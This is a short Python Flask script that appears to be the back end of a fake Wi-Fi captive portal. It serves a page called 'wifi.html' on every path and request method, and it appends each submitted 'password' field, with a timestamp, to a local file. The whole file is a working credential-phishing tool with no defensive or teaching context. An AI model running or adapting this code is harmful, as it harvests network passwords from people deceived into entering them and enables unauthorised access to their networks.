from flask import Flask,render_template,request
import sys
from datetime import datetime

app = Flask(__name__)

def writeInFile(password):
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("password.txt","a") as file:
        file.write(password+"\ttime : "+time+"\n")

@app.route('/',defaults={'path':''},methods=['GET','POST','DELETE','PUT','PATCH'])
@app.route('/<path:path>', methods=['GET','POST','DELETE','PUT','PATCH'])
def handle_other_requests(path):
    if request.method == 'POST':
        password = request.form.get('password')
        writeInFile(password)
        
    return render_template("wifi.html")

if __name__ == "__main__":
    portValu = sys.argv[1]
    app.run(host='0.0.0.0', port=int(portValu))